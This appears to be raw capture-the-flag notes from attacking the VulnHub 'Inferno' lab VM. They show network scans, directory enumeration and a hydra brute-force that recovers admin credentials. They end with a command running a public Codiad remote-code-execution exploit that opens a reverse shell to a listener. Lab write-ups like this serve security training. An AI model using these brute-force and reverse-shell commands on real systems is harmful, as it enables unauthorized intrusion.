@@ -1,0 +1,327 @@
+INFERNO 
+
+
+ENUERATION 
+
+
+HOST IDENTIFY 
+NETDISCOVER
+"""
+
+
+
+
+
+ Currently scanning: 192.168.205.0/16   |   Screen View: Unique Hosts                                                                                                 
+                                                                                                                                                                      
+ 55 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 3300                                                                                                    
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.100.1   24:44:27:2a:9c:c0     53    3180  HUAWEI TECHNOLOGIES CO.,LTD                                                                                        
+ 192.168.100.6   60:f6:77:8b:13:7f      1      60  Intel Corporate                                                                                                    
+ 192.168.100.35  08:00:27:d3:97:5e      1      60  PCS Systemtechnik GmbH                                                                                             
+
+
+
+
+
+
+HOST IS 192.168.100.35
+
+"""
+
+
+NMAP 
+
+"""
+
+
+
+
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/INFERNO]
+└─$ sudo nmap -p- -sC -sV -A  --min-rate 2000 192.168.100.35 -oN nmap.txt 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-10 02:17 EST
+Stats: 0:01:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.60% done; ETC: 02:19 (0:00:00 remaining)
+Stats: 0:05:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.59% done; ETC: 02:22 (0:00:01 remaining)
+Stats: 0:05:52 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.60% done; ETC: 02:23 (0:00:01 remaining)
+Stats: 0:05:52 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.60% done; ETC: 02:23 (0:00:01 remaining)
+Stats: 0:05:52 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.60% done; ETC: 02:23 (0:00:01 remaining)
+Stats: 0:08:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.95% done; ETC: 02:25 (0:00:00 remaining)
+Nmap scan report for 192.168.100.35
+Host is up (0.00044s latency).
+Not shown: 65444 closed tcp ports (reset)
+PORT      STATE SERVICE           VERSION
+21/tcp    open  ftp?
+22/tcp    open  ssh               OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:f4:d2:47:74:86:2f:b4:94:62:cd:31:f6:ef:51:a4 (RSA)
+|   256 01:e9:02:a3:ff:ff:4a:7b:f2:20:1e:0b:44:9d:7f:f7 (ECDSA)
+|_  256 a5:dc:a7:b1:20:33:f1:8d:c7:dd:f1:a3:59:5d:c2:34 (ED25519)
+23/tcp    open  telnet?
+25/tcp    open  smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+53/tcp    open  domain?
+80/tcp    open  http              Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Dante's Inferno
+88/tcp    open  kerberos-sec?
+106/tcp   open  pop3pw?
+110/tcp   open  pop3?
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+194/tcp   open  irc?
+|_irc-info: Unable to open connection
+389/tcp   open  ldap?
+443/tcp   open  https?
+464/tcp   open  kpasswd5?
+636/tcp   open  ldapssl?
+750/tcp   open  kerberos?
+775/tcp   open  entomb?
+777/tcp   open  multiling-http?
+779/tcp   open  unknown
+783/tcp   open  spamassassin?
+808/tcp   open  ccproxy-http?
+873/tcp   open  rsync?
+1001/tcp  open  webpush?
+1178/tcp  open  skkserv?
+1210/tcp  open  eoss?
+1236/tcp  open  bvcontrol?
+1300/tcp  open  h323hostcallsc?
+1313/tcp  open  bmc_patroldb?
+1314/tcp  open  pdps?
+1529/tcp  open  support?
+2000/tcp  open  cisco-sccp?
+2003/tcp  open  finger?
+|_finger: ERROR: Script execution failed (use -d to debug)
+2121/tcp  open  ccproxy-ftp?
+2150/tcp  open  dynamic3d?
+2600/tcp  open  zebrasrv?
+2601/tcp  open  zebra?
+2602/tcp  open  ripd?
+2603/tcp  open  ripngd?
+2604/tcp  open  ospfd?
+2605/tcp  open  bgpd?
+2606/tcp  open  netmon?
+2607/tcp  open  connection?
+2608/tcp  open  wag-service?
+2988/tcp  open  hippad?
+2989/tcp  open  zarkov?
+4224/tcp  open  xtell?
+4557/tcp  open  fax?
+4559/tcp  open  hylafax?
+4600/tcp  open  piranha1?
+4949/tcp  open  munin?
+5051/tcp  open  ida-agent?
+5052/tcp  open  ita-manager?
+5151/tcp  open  esri_sde?
+5354/tcp  open  mdnsresponder?
+5355/tcp  open  llmnr?
+5432/tcp  open  postgresql?
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+5555/tcp  open  freeciv?
+5666/tcp  open  nrpe?
+5667/tcp  open  unknown
+5674/tcp  open  hyperscsi-port?
+5675/tcp  open  v5ua?
+5680/tcp  open  canna?
+6346/tcp  open  gnutella?
+6514/tcp  open  syslog-tls?
+6566/tcp  open  sane-port?
+6667/tcp  open  irc?
+|_irc-info: Unable to open connection
+8021/tcp  open  ftp-proxy?
+8081/tcp  open  blackice-icecap?
+8088/tcp  open  radan-http?
+8990/tcp  open  http-wmap?
+9098/tcp  open  unknown
+9359/tcp  open  unknown
+9418/tcp  open  git?
+9673/tcp  open  unknown
+10000/tcp open  snet-sensor-mgmt?
+10081/tcp open  famdc?
+10082/tcp open  amandaidx?
+10083/tcp open  amidxtape?
+11201/tcp open  smsqp?
+15345/tcp open  xpilot?
+17001/tcp open  unknown
+17002/tcp open  unknown
+17003/tcp open  unknown
+17004/tcp open  unknown
+20011/tcp open  unknown
+20012/tcp open  ss-idi-disc?
+24554/tcp open  binkp?
+27374/tcp open  subseven?
+30865/tcp open  unknown
+57000/tcp open  unknown
+60177/tcp open  unknown
+60179/tcp open  unknown
+MAC Address: 08:00:27:D3:97:5E (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.44 ms 192.168.100.35
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 567.82 seconds
+                                                                
+
+
+
+
+
+
+"""
+
+
+http://192.168.100.35/
+
+PAGE CONTENT 
+
+"""
+
+
+
+
+Oh, how great a surprise it seemed to me
+when I saw three faces in his head!
+One before, and that was vermilion;
+
+the other two were added to this one
+over the middle of each shoulder,
+and if you reach the place of the crest
+
+
+"""
+
+
+GOBUSTER
+"""
+
+
+
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/INFERNO]
+└─$ gobuster dir -u http://192.168.100.35/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error  -x php,txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.100.35/
+[+] Method:                  GET
+[+] Threads:                 80
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+2022/03/10 02:18:34 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/.htpasswd.txt        (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/.htaccess.txt        (Status: 403) [Size: 279]
+/server-status        (Status: 403) [Size: 279]
+                                               
+===============================================================
+2022/03/10 02:18:53 Finished
+
+
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/INFERNO]
+└─$ gobuster dir -u http://192.168.100.35 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 80 --no-error  -x php,txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.100.35
+[+] Method:                  GET
+[+] Threads:                 80
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+2022/03/10 02:38:15 Starting gobuster in directory enumeration mode
+===============================================================
+/inferno              (Status: 401) [Size: 461]
+Progress: 91797 / 661683 (13.87%)             ^C
+[!] Keyboard interrupt detected, terminating.
+                                               
+===============================================================
+2022/03/10 02:39:02 Finished
+===============================================================
+
+
+
+
+
+
+
+
+"""
+/inferno is a login page lets brute force it 
+
+
+"""
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 192.168.100.35 http-get /inferno/ -t64
+
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/INFERNO]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 192.168.100.35 http-get /inferno/ -t64
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-10 02:46:47
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking http-get://192.168.100.35:80/inferno/
+[80][http-get] host: 192.168.100.35   login: admin   password: dante1
+[STATUS] attack finished for 192.168.100.35 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-10 02:47:27
+                                                                                      
+
+"""
+
+
+CODIAD
+
+ONLINE IDE 
+
+FOUND RCE EXPLOIT FOR CODIAD
+"""
+
+https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git
+
+
+python2 exploit.py http://admin:dante1@192.168.100.35/inferno/  'admin'  'dante1' 192.168.100.33 4444 linux
+
+
+
+
+
+"""
